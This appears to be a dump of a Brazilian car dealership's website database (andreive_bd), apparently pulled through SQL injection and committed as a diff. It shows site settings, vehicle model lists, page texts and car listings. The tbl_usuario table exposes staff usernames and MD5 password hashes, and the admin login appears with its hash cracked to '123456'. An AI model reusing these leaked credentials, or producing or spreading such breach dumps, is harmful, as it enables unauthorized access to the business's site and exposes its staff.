+| id | nome                | texto                                  |
++----+---------------------+----------------------------------------+
+| 1  | TITLE               | Andrei Veículos                        |
+| 2  | Meta DESCRIPTION    | Description                            |
+| 3  | Meta ABSTRACT       | Sintese                                |
+| 4  | Meta KEYWORDS       | Keywords                               |
+| 5  | Meta ROBOT          | All                                    |
+| 6  | Meta RATING         | general                                |
+| 7  | Meta DISTRIBUTION   | local                                  |
+| 8  | Meta LANGUAGE       | pt                                     |
+| 9  | Meta og:title       | Titulo que aparecera no facebook       |
+| 10 | Meta og:url         | Url que aparecera no facebook          |
+| 12 | Meta og:site_name   | nome do site que aparecera no facebook |
+| 13 | Meta og:description | descricao que aparecera no facebook    |
++----+---------------------+----------------------------------------+
+
+Database: andreive_bd
+Table: tbl_slides
+[3 entries]
++----+-------------------------------------------+---------+-------------------------------+---------+-----------+
+| id | link                                      | texto   | imagem                        | titulo  | subtitulo |
++----+-------------------------------------------+---------+-------------------------------+---------+-----------+
+| 53 | http://www.andreiveiculos.com.br/veiculos | <blank> | midias/slides/15526007671.jpg | <blank> | <blank>   |
+| 54 | http://www.andreiveiculos.com.br/veiculos | <blank> | midias/slides/15526007761.jpg | <blank> | <blank>   |
+| 55 | http://www.andreiveiculos.com.br/veiculos | <blank> | midias/slides/15526007831.jpg | <blank> | <blank>   |
++----+-------------------------------------------+---------+-------------------------------+---------+-----------+
+
+Database: andreive_bd
+Table: tbl_subcategorias
+[265 entries]
++-----+----------------------------------------------------------+-----------+
+| id  | nome                                                     | categoria |
++-----+----------------------------------------------------------+-----------+
+| 9   | Palio ATTRACTIVE 1.4 EVO Fire Flex 8v 5p                 | 10        |
+| 10  | Uno Mille 1.0 Fire/ F.Flex/ ECONOMY 2p                   | 10        |
+| 13  | Logan                                                    | 11        |
+| 16  | Corolla SE-G 1.8/1.8 Flex 16V Aut.                       | 7         |
+| 17  | Gol Trendline 1.0 T.Flex 8V 5p                           | 9         |
+| 20  | CRF 230 F                                                | 24        |
+| 22  | EcoSport FREESTYLE 1.6 16V Flex 5p                       | 13        |
+| 23  | Fiesta SE 1.0 8V Flex 5p                                 | 13        |
+| 25  | Kombi Standard 1.4 8v Totalflex - 2014                   | 9         |
+| 26  | S10 Pick-Up Std 2.8 4x4 CD TB Int.Dies.                  | 5         |
+| 28  | Saveiro 1.6 Mi Total Flex 8V CE                          | 9         |
+| 29  | GTI 155                                                  | 14        |
+| 30  | Strada 1.4 mpi Fire Flex 8V CS                           | 10        |
+| 32  | Golf Sportline 1.6 Mi Total Flex 8V 4p                   | 9         |
+| 33  | Fiesta 1.5 16V Flex Mec. 5p                              | 13        |
+| 34  | SpaceCross 1.6 Mi Total Flex 8V                          | 9         |
+| 35  | FLUENCE Sedan Dynamique 2.0 16V FLEX Aut                 | 11        |
+| 37  | Gol (novo) 1.0 Mi Total Flex 8V 2p                       | 9         |
+| 39  | BROS NXR 150 ESD                                         | 24        |
+| 40  | Corolla XEi 2.0 Flex Aut.                                | 7         |
+| 42  | Palio 1.0 ECONOMY Fire Flex 8V 4p                        | 10        |
+| 43  | Corsa Wind 1.0 MPF/MilleniumI/ EFI 4p                    | 5         |
+| 44  | Doblo ELX 1.4 mpi Fire Flex 8V 4p                        | 10        |
+| 45  | Strada Working 1.4 mpi Fire Flex 8V CS                   | 10        |
+| 46  | Hilux CD SRX 4x4 2.8 Diesel Aut                          | 7         |
+| 47  | Fit EX/S/EX 1.5 Flex/Flexone 16V 5p Aut.                 | 6         |
+| 48  | Gol Trendline 1.6 T.Flex 8V 5p                           | 9         |
+| 50  | Gol (novo) 1.0 Mi Total Flex 8V 4p                       | 9         |
+| 51  | Discovery4 S 3.0 4x4 SDV6 Die.Aut.                       | 16        |
+| 52  | SW4 SRV D4-D 4X4 3.0 Diesel Automática                   | 7         |
+| 53  | Saveiro Cross 1.6 CE                                     | 9         |
+| 55  | Clio Cam Hi-Flex 1.0 16v 5p                              | 11        |
+| 56  | Vectra Elite 2.4 Aut. - 2006                             | 5         |
+| 57  | CROSSFOX 1.6 Mi Total Flex 8V 5p                         | 9         |
+| 59  | Ka 1.0 Ticvt Flex 5P                                     | 13        |
+| 63  | Golf Highline 1.4 TSI 140cv Aut.                         | 9         |
+| 64  | UNO ECONOMY 1.4 EVO Fire Flex 8V 4p                      | 10        |
+| 66  | Gol 1.6 Mi Power Total Flex 8V 4p                        | 9         |
+| 68  | Vectra GLS 2.2 - 1998                                    | 5         |
+| 69  | Civic Sedan LXS 1.8  Aut. 4p                             | 6         |
+| 70  | Fiesta 1.6 8V Flex/Class 1.6 8V Flex 5p                  | 13        |
+| 71  | XRE 300/ 300 ABS/ Flex                                   | 24        |
+| 72  | CG 150 FAN ESDi/ 150 FAN ESDi FLEX                       | 24        |
+| 73  | GTI 130                                                  | 14        |
+| 74  | Gol (novo) 1.6 Mi Total Flex 8V 4p                       | 9         |
+| 75  | Gol (novo) 1.6 Mi Total Flex 8V 4p                       | 9         |
+| 76  | Classic LS 1.0 VHC FlexPower 4p                          | 5         |
+| 77  | SPACEFOX 1.6/ 1.6 Trend Total Flex 8V 5p                 | 9         |
+| 78  | PRISMA Sed. Maxx 4p                                      | 5         |
+| 79  | CR-V EXL 2.0 16V 4WD/2.0 Flexone Aut.                    | 6         |
+| 80  | CBR 650F                                                 | 24        |
+| 81  | Fox 1.6 Confortline                                      | 9         |
+| 83  | BIZ 125 ES/ ES F.INJ./ES MIX F.INJECTION                 | 24        |
+| 84  | Doblo Adv/Adv TRYON/LOCKER 1.8 Flex                      | 10        |
+| 86  | Astra Elite 2.0 MPFI FlexPower 8V 5p Mec                 | 5         |
+| 87  | UNO Way Celebration 1.0 EVO Fire Flex 8V 4p              | 10        |
+| 88  | KA 1.0 8V/1.0 8V ST Flex 3p                              | 10        |
+| 89  | Corsa Hat. Maxx 1.8 MPFI 8V FlexPower 5p                 | 5         |
+| 90  | Astra Sed.Elite 2.0 MPFI FlexPower 8V 4p                 | 5         |
+| 91  | Fox 1.0 Mi Total Flex 8V 5p                              | 9         |
+| 92  | R.EVOQUE Prestige Tech 2.0 Aut 5p                        | 16        |
+| 95  | Civic Sedan LXS 1.8/1.8 Flex 16V Mec. 4p                 | 6         |
+| 96  | Fusion 2.5 16V iVCT (Flex) (Aut)                         | 13        |
+| 97  | CG 150 TITAN-EX MIX/FLEX                                 | 24        |
+| 99  | Palio EX 1.0 mpi Fire/ Fire Flex 8v 2p                   | 10        |
+| 100 | Palio EX 1.0 mpi Fire/ Fire Flex 8v 2p                   | 6         |
+| 102 | Golf 1.6Mi/ 1.6Mi Gener./Black & Silver                  | 9         |
+| 103 | NXR 125 Bros KS                                          | 24        |
+| 104 | BIZ 125 EX/ 125 EX FLEX                                  | 24        |
+| 105 | NXR 150 Bros ES MIX/FLEX                                 | 24        |
+| 106 | Gol (novo) 1.6 Power/Highi T.Flex 8v 4P                  | 9         |
+| 107 | AGILE LTZ 1.4 MPFI 8V FlexPower 5p                       | 5         |
+| 108 | SANDERO STEPWAY Hi-Power 1.6 8V 5p                       | 11        |
+| 109 | CBR 600 RR                                               | 24        |
+| 110 | Fox Comfortline 1.0 Flex 8V 5p                           | 9         |
+| 111 | Celta Spirit/ LT 1.0 MPFI 8V FlexP. 5p                   | 5         |
+| 113 | Megane Grand Tour Dynam. Hi-Flex 1.6 16V                 | 11        |
+| 114 | Saveiro 1.6 Mi/ 1.6 Mi Total Flex 8V                     | 9         |
+| 115 | TRACKER 2.0 16v 128cv MPFI 4x4 5p                        | 5         |
+| 116 | CB 300R/ 300R FLEX                                       | 24        |
+| 117 | Fiesta 1.0 8V Flex/Class 1.0 8V Flex 5p                  | 13        |
+| 119 | UNO SPORTING 1.4 EVO Fire Flex 8V 2p                     | 10        |
+| 120 | Civic Sedan EXR 2.0 Flexone 16V Aut. 4p                  | 6         |
+| 121 | Clio Campus Hi-Flex 1.0 16V 3p                           | 11        |
+| 122 | Uno Mille 1.0 Fire/ F.Flex/ ECONOMY 4p                   | 10        |
+| 123 | Parati SURF 1.6 Mi Total Flex                            | 9         |
+| 124 | Range R. EVOQUE SI4 HSE Dynamic 2.0 Aut.                 | 16        |
+| 125 | NX-4 FALCON 400                                          | 24        |
+| 126 | AGILE LT 1.4 MPFI 8V FlexPower 5p                        | 5         |
+| 129 | Doblo Adv.Ext./Adv.Ext.Loc. 1.8 16V Flex                 | 10        |
+| 130 | CG 150 TITAN-ESD/ TITAN SPECIAL EDITION                  | 24        |
+| 131 | Corsa Hat. Premium 1.4 8V ECONOFLEX 5p                   | 5         |
+| 132 | EDGE SEL 3.5 V6 24V AWD Aut.                             | 13        |
+| 134 | HB20 Premium 1.6 Flex 16V Mec.                           | 21        |
+| 135 | \t ONIX HATCH LTZ 1.4 8V FlexPower 5p Mec.               | 5         |
+| 136 | Saveiro TROOPER 1.6 Mi Total Flex 8V CE                  | 9         |
+| 137 | Strada Adv. Ext./ Ext.1.8 LOCKER Flex CE                 | 10        |
+| 138 | EcoSport XLT FREESTYLE 1.6 Flex 8V 5p                    | 13        |
+| 139 | HB20 Confort 1.0 Flex                                    | 21        |
+| 141 | PIAGGIO VESPA PX 200                                     | 22        |
+| 142 | HB20 Comfort Style 1.6 Flex Aut.                         | 21        |
+| 143 | Fox Rock in Rio 1.6 Mi Total Flex 8V 5p                  | 9         |
+| 144 | NINJA ZX-6R 600cc                                        | 23        |
+| 145 | KAWASAKI NINJA 250R                                      | 23        |
+| 146 | Strada Working 1.4 mpi Fire Flex 8V CD                   | 10        |
+| 147 | VOYAGE 1.6 City Mi Total Flex 8V 4p                      | 9         |
+| 148 | Saveiro GL 1.8Mi                                         | 9         |
+| 149 | Uno Mille WAY ECONOMY 1.0 F.Flex 4p                      | 10        |
+| 150 | PRISMA Sedan Joy 1.0 8V FlexPower                        | 5         |
+| 151 | ONIX HATCH LT 1.0 8V Flex Power                          | 5         |
+| 152 | Fit LX 1.5 Flexone 16V 5p Aut.                           | 6         |
+| 153 | Fit EXL 1.5 Flex/Flexone 16V 5p Aut                      | 6         |
+| 155 | VOYAGE Confortline 1.6 Mi T.Flex 8V 4p                   | 9         |
+| 156 | Voyage 1.0 City Mi Total Flex 8V 4p                      | 9         |
+| 157 | Palio ATTRACTIVE 1.0 EVO Fire Flex 8v 5p                 | 10        |
+| 158 | UNO SPORTING 1.4 EVO Fire Flex 8V 4p                     | 10        |
+| 159 | Renault LOGAN Expres./Exp. UP Hi-Flex 1.0 16V 4p         | 11        |
+| 160 | Saveiro Startline 1.6 T.Flex 8V                          | 9         |
+| 161 | Strada Adventure1.8 Flex CD                              | 10        |
+| 162 | Saveiro TROOPER 1.6 Mi Total Flex 8V CE                  | 9         |
+| 164 | Fit EXL 1.5 Flex Automático                              | 6         |
+| 165 | Range R.EVOQUE Dynamic 2.0 4WD Aut 5p                    | 16        |
+| 166 | Classic/ Classic LS 1.0 VHC FlexPower 4p                 | 5         |
+| 167 | Meriva 1.8/ CD 1.8 MPFI 8V 102cv 5p                      | 5         |
+| 168 | Cruze LTZ 1.8 16V Ecotec Aut                             | 5         |
+| 169 | i30 2.0 16V 145cv 5p Aut.                                | 21        |
+| 170 | Hilux CD SRV D4-D 4x4 3.0 TDI Diesel Aut                 | 7         |
+| 171 | Civic Sedan EXS 1.8 Automático                           | 6         |
+| 172 | Voyage Trend 1.6 Flex                                    | 9         |
+| 173 | Kangoo Express Hi-Flex 1.6 16V                           | 11        |
+| 174 | Gol (novo) 1.6 Mi Total Flex 8V 4p                       | 9         |
+| 175 | Celta Life 1.0 MPFI VHC 8V 5p                            | 5         |
+| 176 | Elantra GLS 2.0 16V Flex Aut.                            | 21        |
+| 177 | Fiesta Sedan 1.0 8V Flex 4p                              | 13        |
+| 178 | CROSSFOX 1.6 Mi Total Flex 8V 5p                         | 9         |
+| 179 | CRF 250 X                                                | 24        |
+| 180 | Vectra Elegance 2.0 MPFI                                 | 5         |
+| 181 | CG 125 FAN ES                                            | 24        |
+| 182 | EcoSport FREESTYLE 1.6 16V Flex 5p                       | 13        |
+| 183 | Clio Expression 1.0 16V Flex                             | 11        |
+| 184 | HB20 Premium 1.6 Flex 16V Aut.                           | 21        |
+| 186 | SANDERO Expression Hi-Flex 1.0 8V 5p                     | 11        |
+| 187 | Hyundai HB20S Confort Style1.0 Flex 12V Mec. 4P          | 21        |
+| 188 | UNO VIVACE Celeb. 1.0 EVO F. Flex 8V 3p                  | 10        |
+| 190 | Parati 1.6 Track Field Total Flex                        | 9         |
+| 191 | Polo Sedan 1.6 Mi Total Flex 8V 4p                       | 9         |
+| 192 | Palio ELX 1.0 Fire  F. Flex 8V 4p                        | 10        |
+| 193 | CG 160 FAN ESDI FLEXONE                                  | 24        |
+| 194 | RENAULT CLIO AUTHENTIQUE 1.0/1.0 HI-POWER 16V 3P         | 11        |
+| 195 | CLIO AUTHENTIQUE 1.0                                     | 11        |
+| 196 | HB20S CONFORT STYLE1.6 FLEX 16V AUT. 4P                  | 21        |
+| 197 | STRADA ADVENTURE 1.8 FLEX CE                             | 10        |
+| 198 | CG 125                                                   | 24        |
+| 199 | JETTA Highline 2.0 TSI Tiptronic                         | 9         |
+| 200 | COROLLA XEI 1.8 AUT                                      | 7         |
+| 201 | Bravo SPORTING 1.8 Flex 16V 5p                           | 10        |
+| 202 | Astra Elegance 2.0 Flex                                  | 5         |
+| 203 | CG 150 FAN ESi/ 150 FAN ESi FLEX                         | 24        |
+| 204 | Linea 1.8 16V Essence - 2014                             | 10        |
+| 205 | Civic Sedan LXR 2.0 Flexone Automático                   | 6         |
+| 206 | Chevrolet S10 2.8 CTDi 4x4 LTZ (Cab Dupla) (Aut)         | 5         |
+| 207 | YS 250 Fazer Blueflex                                    | 25        |
+| 208 | Saveiro Trendline 1.6 T.Flex 8V CE                       | 9         |
+| 209 | Gol 1.0 Total Flex 8V 5p (25 Anos)                       | 9         |
+| 210 | FOX TRENDLINE 1.0 FLEX 8V 5P                             | 9         |
+| 211 | UNO WAY CELEB. 1.4 EVO FIRE FLEX 8V 5P                   | 10        |
+| 212 | F-1000 S. S. DIESEL / S.S. DIESEL TURBO                  | 13        |
+| 213 | FOX TRENDLINE 1.6 FLEX 8V 5P                             | 9         |
+| 214 | HILUX CD 4X4 2.8 DIESEL MEC.                             | 7         |
+| 215 | LAND ROVER DISCOVERY4 SE 3.0 4X4 SDV6 DIE.AUT.           | 16        |
+| 216 | KA 1.0 8V/1.0 8V ST FLEX 3P                              | 13        |
+| 217 | PALIO ESSENCE 1.6 FLEX 16V 5P                            | 10        |
+| 218 | FOX 1.6 MI TOTAL FLEX 8V 5P                              | 9         |
+| 219 |  BIZ 110I                                                | 24        |
+| 220 | KADETT GL 2.0 MPFI                                       | 5         |
+| 222 | GOL CITY 1.0 MI TOTAL FLEX 8V 4P                         | 9         |
+| 223 | ix35 GLS 2.0 16V 2WD Flex Aut.                           | 21        |
+| 224 | ONIX HATCH LTZ 1.4 8V FLEXPOWER 5P AUT.                  | 5         |
+| 225 | FOX 1.0 MI TOTAL FLEX 8V 3P                              | 9         |
+| 226 | SANDERO EXPRESSION HI-POWER 1.6 8V 5P                    | 11        |
+| 227 | ONIX HATCH JOY 1.0 8V FLEX 5P MEC.                       | 5         |
+| 228 | STRADA WORKING 1.4 MPI FIRE FLEX 8V CE                   | 10        |
+| 229 | HILUX SW4 SRV D4-D 4X4 3.0 TDI DIES. AUT                 | 7         |
+| 230 | GOL TRENDLINE 1.0 T.FLEX 12V 5P                          | 9         |
+| 231 | KA 1.0 SE 12V FLEX 4P MANUAL                             | 13        |
+| 232 | FLUENCE SEDAN GT LINE 2.0 FLEX AUT.                      | 11        |
+| 233 | CELTA LS 1.0 MPFI 8V FLEXPOWER 3P                        | 5         |
+| 234 | BONGO K-2500 2.5 4X2 TB DIESEL                           | 27        |
+| 235 | CORSA HAT. MAXX 1.4 8V ECONOFLEX 5P                      | 5         |
+| 236 | FIT LX 1.5 FLEXONE 16V 5P AUT.                           | 6         |
+| 237 | CELTA LS 1.0 MPFI 8V FLEXPOWER 5P                        | 5         |
+| 238 | CIVIC SEDAN LXS 1.8 FLEX 16V MEC. 4P                     | 6         |
+| 239 | HB20S PREMIUM 1.6 FLEX 16V AUT. 4P                       | 21        |
+| 240 | NXR 150 BROS ESD                                         | 24        |
+| 241 | Toro Freedom Road 1.8 16V Flex Aut.                      | 10        |
+| 242 | Corolla Sedan ALTIS 2.0 Flex 16V Aut                     | 7         |
+| 243 | WR-V EX 1.5 FLEXONE 16V 5P AUT.                          | 6         |
+| 244 | Corolla SE-G 1.8/1.8 Flex 16V Aut.                       | 7         |
+| 245 | Gol SELEÇÃO 1.6 Total Flex 8V 5p                         | 9         |
+| 246 | COROLLA XLI 1.8/1.8 FLEX 16V AUT.                        | 7         |
+| 247 | PALIO ELX 1.0 FIRE/30 ANOS F. FLEX 8V 4P                 | 10        |
+| 248 | GOL 1.0 TREND/ POWER 8V 4P                               | 9         |
+| 249 | SANDERO AUTHENTIQUE HI-FLEX 1.0 16V 5P                   | 11        |
+| 250 | PALIO WEEKEND ADVENTURE LOCKER 1.8 FLEX                  | 10        |
+| 251 | PALIO ATTRACTIVE 1.0 EVO FIRE FLEX 8V 5P                 | 10        |
+| 252 | NXR 160 BROS ESDD FLEXONE                                | 6         |
+| 253 | VOYAGE TRENDLINE 1.6 T.FLEX 8V 4P                        | 9         |
+| 254 | FOX RUN 1.6 FLEX 8V 5P                                   | 9         |
+| 255 | CLASSIC LIFE/LS 1.0 VHC FLEXP. 4P                        | 5         |
+| 256 | EcoSport SE 1.5 Automatica (Flex)                        | 13        |
+| 257 | Gol 1.0 Comfortline                                      | 9         |
+| 258 |  VW - VOLKSWAGEN VOYAGE COMF/HIGHLI. 1.6 MI T.FLEX 8V 4P | 9         |
+| 259 | FIESTA 1.0 8V FLEX/CLASS 1.0 8V FLEX 5P                  | 13        |
+| 260 | Doblo Attractive 1.4 8V (Flex) 7 lugares                 | 10        |
+| 261 | HILUX CD SRV D4-D 4X4 3.0 TDI DIES                       | 7         |
+| 262 | TORO OPENING ED. PLUS 1.8 16V FLEX AUT.                  | 10        |
+| 263 | UNO VIVACE CELEB. 1.0 EVO F.FLEX 8V 5P                   | 10        |
+| 264 | NEW BEETLE 2.0 MI AUT.                                   | 9         |
+| 265 | DUSTER DYNAMIQUE 2.0 HI-FLEX 16V MEC.                    | 11        |
+| 266 | GRAND SIENA ATTRACTIVE 1.0 FLEX 8V 4P                    | 10        |
+| 267 | CAPTIVA SPORT FWD 2.4 16V 171/185CV                      | 5         |
+| 268 | CORSA HAT. MAXX 1.0/ 1.0 FLEXPOWER 8V 5P                 | 5         |
+| 269 | FRONTIER SEL CD 4X4 2.5 TB DIESEL AUT.                   | 25        |
+| 270 | SIENA CELEBRATION 1.0 FIRE FLEX 8V 4P                    | 10        |
+| 271 | C 100 BIZ-ES                                             | 24        |
+| 272 | FOX COMFORTLINE 1.6 FLEX 8V 5P                           | 9         |
+| 273 | HB20 PREMIUM 1.6 FLEX 16V AUT.                           | 21        |
+| 274 | FIT EX/S/EX 1.5 FLEX/FLEXONE 16V 5P AUT.                 | 6         |
+| 275 | POLO 1.6 MI/S.OURO 1.6 MI TOT.FLEX 8V 5P                 | 9         |
+| 276 | Jet ski GTI 130                                          | 26        |
+| 277 | D20 Pick Up Conquest 4.0 (Cab Simples) 1992              | 5         |
+| 278 | Strada Hard Working 1.4 Fire Flex 8V CE                  | 10        |
+| 279 | VOYAGE Comfortline 1.0 T.Flex 12V 4p                     | 9         |
+| 280 | FIORINO FURGÃO WORK. HARD 1.4 FLEX 8V 2P                 | 10        |
+| 281 | CRUZE SPORT LTZ 1.4 16V TB FLEX 5P AUT.                  | 5         |
+| 282 | SANDERO AUTH. PLUS HI-POWER 1.0 16V 5P                   | 11        |
+| 283 | GTR 230                                                  | 26        |
+| 284 | SPIN LTZ 1.8 8V ECONO.FLEX 5P MEC.                       | 5         |
+| 285 | FIT LX 1.4/ 1.4 FLEX 8V/16V 5P MEC.                      | 24        |
+| 286 | CAPTIVA SPORT FWD 2.4 16V 171/185CV                      | 5         |
+| 287 | GOL RALLYE I MOTION 1.6 T. FLEX 16V 5P                   | 9         |
+| 288 | HB20 COMF./C.PLUS/C.STYLE 1.0 FLEX 12V                   | 21        |
+| 289 | FIT LXL 1.4/ 1.4 FLEX 8V/16V 5P AUT.                     | 24        |
+| 290 | CB 650F                                                  | 24        |
+| 291 | COROLLA ALTIS 2.0 FLEX 16V AUT.                          | 7         |
+| 292 | Delivery 8.160 Advan/tech ¾                              | 9         |
+| 293 | CIVIC SEDAN EX 2.0 FLEX 16V AUT.4P                       | 24        |
+| 294 | Atron 2729 (6X4) Truck                                   | 27        |
+| 295 | GOL TRENDLINE 1.0 T.FLEX 12V 5P                          | 9         |
+| 296 | XC 60 T-5 KINETIC 2.0 245CV FWD 5P                       | 28        |
+| 297 | CITY SEDAN LX 1.5 FLEX 16V 4P AUT.                       | 6         |
+| 298 | GOL 1.6 MI/ POWER 1.6 MI 4P                              | 9         |
+| 299 | UNO SPORTING DUALOGIC 1.4 EVO FLEX 8V 4P                 | 10        |
+| 300 | HB20 C.STYLE/C.PLUS 1.6 FLEX 16V AUT.                    | 21        |
+| 301 | STRADA WORKING 1.4 MPI FIRE FLEX 8V CD                   | 10        |
+| 302 | FOX CONNECT 1.6 FLEX 8V 5P                               | 9         |
+| 303 | ECOSPORT SE 1.6 16V FLEX 5P MEC.                         | 13        |
+| 304 | CORSA SED. MAXX 1.4 8V ECONOFLEX 4P                      | 5         |
+| 305 | POLO HIGHLINE 200 TSI 1.0 FLEX 12V                       | 9         |
+| 306 | SPIN LTZ 1.8 8V ECONO.FLEX 5P AUT.                       | 5         |
+| 307 | FOX 1.6 MI I MOTION TOTAL FLEX 8V 5P                     | 9         |
+| 308 | ASTRA GL MILENIUM 1.8 MPFI 4P                            | 5         |
+| 309 | CROSSFOX I MOTION 1.6 MI T. FLEX 8V 5P                   | 9         |
+| 310 | C3 EXCLUSIVE 1.5 FLEX 8V 5P MEC.                         | 29        |
+| 311 | JETTA COMFORTLINE 1.4 TSI 16V 4P AUT.                    | 9         |
++-----+----------------------------------------------------------+-----------+
+
+Database: andreive_bd
+Table: tbl_textos
+[20 entries]
++----+---------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+--------+------------+
+| id | nome          | texto                                                                                                                                                           | pagina | observacao |
++----+---------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+--------+------------+
+| 1  | Titulo Busca  | <p><span style="color:rgb(84, 84, 84); font-family:arial,sans-serif; font-size:small">Confira nossos modelos e escolha o que mais combina com voc\xea</span></p | 1      | <blank>    |
+| 2  | Titulo        | <p>CONHE\xc7A NOSSOS VE\xcdCULOS</p>\r\n                                                                                                                        | 1      | <blank>    |
+| 3  | Titulo        | <p>Ve\xedculos em Destaque</p>\r\n                                                                                                                              | 1      | <blank>    |
+| 4  | Titulo        | <p>\xdaltimas Not\xedcias</p>\r\n                                                                                                                               | 1      | <blank>    |
+| 5  | Titulo Footer | <p>Hor\xe1rio de Funcionamento</p>\r\n                                                                                                                          | 1      | <blank>    |
+| 6  | Atendimento   | Vendas                                                                                                                                                          | 1      | <blank>    |
+| 7  | Atendimento   | <p>Seg-Sex: 8:00 \xe0s 18:00</p>\r\n                                                                                                                            | 1      | <blank>    |
+| 8  | Atendimento   | <p>S\xe1b: 08:00 \xe0s 12:00</p>\r\n                                                                                                                            | 1      | <blank>    |
+| 9  | Atendimento   | Atendimento                                                                                                                                                     | 1      | <blank>    |
+| 10 | Atendimento   | <p>Seg-Sex: 8:00 \xe0s 18:00</p>\r\n                                                                                                                            | 1      | <blank>    |
+| 11 | Atendimento   | <p>S\xe1b: 08:00 \xe0s 12:00</p>\r\n                                                                                                                            | 1      | <blank>    |
+| 12 | Titulo Footer | <p>Sobre N\xf3s</p>\r\n                                                                                                                                         | 1      | <blank>    |
+| 13 | Sobre Footer  | <p>Oferecemos os melhores autom\xf3veis de diversa                                                                                                              | 1      | <blank>    |
+| 14 | Titulo Footer | <p>\xdaltimos Ve\xedculos</p>\r\n                                                                                                                               | 1      | <blank>    |
+| 15 | Titulo Footer | Curta-nos                                                                                                                                                       | 1      | <blank>    |
+| 16 | Titulo Footer | Contato                                                                                                                                                         | 1      | <blank>    |
+| 17 | Titulo        | Quem Somos                                                                                                                                                      | 2      | <blank>    |
+| 18 | Texto         | <p>A Andrei Ve\xedculos atua no mercado automobili                                                                                                              | 2      | <blank>    |
+| 19 | Titulo        | <p>Multas e IPVA</p>\r\n                                                                                                                                        | 3      | <blank>    |
+| 20 | Texto         | <p>Para fazer consultas de Multas e IPVA acesse o website do Detran de seu estado:</p>\r\n                                                                      | 3      | <blank>    |
++----+---------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+--------+------------+
+
+Database: andreive_bd
+Table: tbl_usuario
+[3 entries]
++----+-----------------+-------------------------------------------+--------------------+-----------+
+| id | nome            | senha                                     | usuario            | permissao |
++----+-----------------+-------------------------------------------+--------------------+-----------+
+| 3  | Andrei Veículos | 2d945614a80b0959c7d7d06ce62f8a29          | andrei             | 0         |
+| 4  | Evandro         | 5e3049674dd892ab3987289a7e73319b          | evandro            | 0         |
+| 5  | Admin           | e10adc3949ba59abbe56e057f20f883e (123456) | admin@admin.com.br | 1         |
++----+-----------------+-------------------------------------------+--------------------+-----------+
+
+Database: andreive_bd
+Table: tbl_veiculos
+[22 entries]
++-----+----------------+------+--------+-------+---------------------------------+---------+--------+--------+----------------------------------------------------------------+----------+----------+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+------------+----------------+--------------+---------------+
+| id  | cor            | ano  | valor  | marca | imagem                          | resumo  | portas | modelo | titulo                                                         | destaque | situacao | descricao                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         | acessorios | combustivel    | tipo_veiculo | quilometragem |
++-----+----------------+------+--------+-------+---------------------------------+---------+--------+--------+----------------------------------------------------------------+----------+----------+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+------------+----------------+--------------+---------------+
+| 395 | Prata          | 2017 | 35900  | 11    | midias/galerias/15271121421.jpg | <blank> | 4      | 249    | RENAULT SANDERO AUTHENTIQUE HI-FLEX 1.0 16V 5P - 2017          | 1        | 2        | <p><span style="color:rgb(74, 74, 74); font-family:nunito; font-size:15.6px">Carro de proced\xeancia, &ua                                                                                                                                                                                                                                                                                                                                                                                         | <blank>    | Bicombustível  | 1            | 46000         |
+| 403 | BRANCA         | 2017 | 169900 | 7     | midias/galerias/15285537681.jpg | <blank> | 4      | 46     | Toyota Hilux 2.8 TDI SRX CD 4x4 Automática - 2017              | 1        | 2        | <h2>Camioneta de proced\xeancia, segundo dono, com                                                                                                                                                                                                                                                                                                                                                                                                                                                | <blank>    | Bicombustível  | 1            | 25000         |
+| 407 | PRATA          | 2017 | 81900  | 10    | midias/galerias/15294425901.jpg | <blank> | 4      | 262    | FIAT TORO OPENING ED. PLUS 1.8 16V FLEX AUT -2017              | 1        | 2        | <p><span style="color:rgb(74, 74, 74); font-family:nunito; font-size:15.6px">Camioneta de proced\xeancia                                                                                                                                                                                                                                                                                                                                                                                          | <blank>    | Bicombustível  | 1            | 55000         |
+| 411 | BRANCA         | 2016 | 33900  | 10    | midias/galerias/15301891511.jpg | <blank> | 4      | 251    | FIAT PALIO ATTRACTIVE 1.0 EVO FIRE FLEX - 2016                 | 1        | 3        | <p><span style="color:rgb(74, 74, 74); font-family:nunito; font-size:15.6px">Carro de proced\xeancia, &ua                                                                                                                                                                                                                                                                                                                                                                                         | <blank>    | Bicombustível  | 1            | 39000         |
+| 428 | Marrom         | 2016 | 53900  | 21    | midias/galerias/15332296631.jpg | <blank> | 4      | 184    | HYUNDAI HB20 PREMIUM 1.6 FLEX 16V AUT. - 2016                  | 1        | 2        | <p><span style="color:rgb(74, 74, 74); font-family:nunito; font-size:15.6px">Carro de proced\xeancia, &ua                                                                                                                                                                                                                                                                                                                                                                                         | <blank>    | Bicombustível  | 1            | 35000         |
+| 447 | BRANCA         | 2016 | 31900  | 11    | midias/galerias/15352065231.jpg | <blank> | 4      | 282    | RENAULT SANDERO AUTH. PLUS HI-POWER 1.0 - 2016                 | 1        | 2        | <div class="OLXad-description mb30px" style="box-sizing: border-box; outline: 0px; font-variant-numeric: inherit; font-variant-east-asian: inherit; font-stretch: inherit; font-size: 12px; line-height: inherit; font-family: Nunito; color: rgb(74, 74, 74); margin-top: 0px; margin-right: 0px; margin-left: 0px; padding: 0px; border: 0px; vertical-align: baseline; overflow: hidden; margin-bottom: 30px !important;">\r\n<p>Carro de proced\xeancia, \xfanico dono, com manual do proprie | <blank>    | Bicombustível  | 1            | 66000         |
+| 463 | BRANCA         | 2018 | 36900  | 5     | midias/galerias/15392898371.jpg | <blank> | 4      | 227    | Gm - Chevrolet Onix Hatch 1.0 JOY Completo - 2018              | 0        | 2        | <p><span style="color:rgb(74, 74, 74); font-family:nunito; font-size:15.6px">Carro de proced\xeancia, &ua                                                                                                                                                                                                                                                                                                                                                                                         | <blank>    | Bicombustível  | 1            | 27000         |
+| 465 | Preta          | 2016 | 32900  | 11    | midias/galerias/15400475661.jpg | <blank> | 4      | 186    | Renault Sandero Expression 1.0 (Flex) Completo 2016            | 1        | 3        | <p><span style="color:rgb(74, 74, 74); font-family:nunito; font-size:15.6px">Carro de proced\xeancia, &ua                                                                                                                                                                                                                                                                                                                                                                                         | <blank>    | Bicombustível  | 1            | 65000         |
